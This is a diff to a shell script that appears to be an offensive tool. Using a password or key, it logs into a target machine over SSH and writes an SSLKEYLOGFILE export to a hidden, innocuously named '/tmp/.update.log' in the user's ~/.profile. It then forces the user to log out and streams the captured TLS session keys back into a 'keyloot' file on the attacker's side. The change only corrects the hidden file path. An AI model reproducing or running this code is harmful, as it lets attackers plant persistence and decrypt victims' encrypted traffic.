@@ -56,7 +56,7 @@ start_wireshark() {
 }
 
 remote_host_pw() {
-    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/update.log" >> ~/.profile ; source ~/.profile' &
+    sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
     sleep 5
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'gnome-session-quit --no-prompt' &
     sshpass -p "${PASS}" ssh -o StrictHostKeyChecking=no ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
@@ -67,7 +67,7 @@ remote_host_pw() {
 }
 
 remote_host_rsa() {
-    ssh -i ${KEYFILE} ${TARGET} 'touch /tmp/update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
+    ssh -i ${KEYFILE} ${TARGET} 'touch /tmp/.update.log ; echo "export SSLKEYLOGFILE=/tmp/.update.log" >> ~/.profile ; source ~/.profile' &
     sleep 5
     ssh -i ${KEYFILE} ${TARGET} 'gnome-session-quit --no-prompt'
     ssh -i ${KEYFILE} ${TARGET} 'tail -f /tmp/.update.log' >> /tmp/pandaloot/keyloot.log &
